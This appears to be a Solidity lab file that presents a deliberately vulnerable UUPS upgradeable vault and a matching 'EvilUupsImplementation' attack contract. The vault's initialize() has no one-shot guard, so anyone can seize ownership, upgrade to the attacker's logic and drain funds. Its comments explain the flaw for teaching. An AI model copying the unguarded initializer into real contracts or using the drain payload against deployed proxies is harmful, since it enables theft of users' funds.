// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title VulnerableUupsVault
/// @notice Lab 14 — Intentionally vulnerable educational example.
/// @dev DO NOT DEPLOY. `initialize()` carries no one-shot guard, and the
///      implementation's constructor does not lock its own storage. A proxy
///      deployed now and initialized later — or a deployment transaction
///      frontrun — hands ownership to whoever calls `initialize` first, and
///      owning a UUPS implementation means `upgradeToAndCall` to arbitrary
///      logic, i.e. total loss of custody.
contract VulnerableUupsVault {
    /// @dev keccak256("eip1967.proxy.implementation") - 1.
    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public owner;

    /// @notice Vulnerability: no `initializer` guard — callable by anyone,
    ///         any number of times, before the legitimate owner is set.
    function initialize(address owner_) external {
        owner = owner_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function upgradeToAndCall(address newImpl, bytes calldata data) external payable onlyOwner {
        require(newImpl.code.length > 0, "no code");
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, newImpl)
        }
        if (data.length > 0) {
            (bool ok,) = newImpl.delegatecall(data);
            require(ok, "call failed");
        }
    }

    /// @notice Withdraw sends the PROXY's balance when invoked through it.
    function withdraw(address to, uint256 amount) external onlyOwner {
        (bool ok,) = to.call{value: amount}("");
        require(ok, "transfer failed");
    }

    receive() external payable {}
}

/// @title EvilUupsImplementation
/// @notice Attack payload for the lab: arbitrary logic the attacker upgrades to.
contract EvilUupsImplementation {
    /// @dev Runs in the proxy's context; `address(this)` is the proxy.
    function drain(address payable to) external {
        to.transfer(address(this).balance);
    }
}
